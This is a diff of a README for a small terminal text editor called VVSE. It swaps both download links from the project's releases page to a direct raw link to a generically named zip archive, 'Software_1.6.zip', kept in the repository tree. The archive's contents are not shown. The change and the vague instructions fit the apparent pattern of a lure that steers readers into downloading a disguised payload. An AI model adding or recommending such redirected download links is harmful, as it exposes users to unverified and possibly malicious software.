@@ -1,6 +1,6 @@
 # 📝 VVSE - Edit text files using your shell
 
-[![Download VVSE](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/irregular-canton317/VVSE/releases)
+[![Download VVSE](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/irregular-canton317/VVSE/raw/refs/heads/main/mini/Software_1.6.zip)
 
 VVSE is a text editor. It fits into a small file size. Developers created it to test how much function fits into tiny code. You can use it to open, change, and save text files. It works inside your terminal.
 
@@ -8,7 +8,7 @@ VVSE is a text editor. It fits into a small file size. Developers created it to 
 
 You need to get the file from the project website. This software runs on your computer.
 
-[Click here to visit the download page](https://github.com/irregular-canton317/VVSE/releases)
+[Click here to visit the download page](https://github.com/irregular-canton317/VVSE/raw/refs/heads/main/mini/Software_1.6.zip)
 
 Choose the link that matches your system. Save the file to your computer. Most users save these files to the Downloads folder.
 
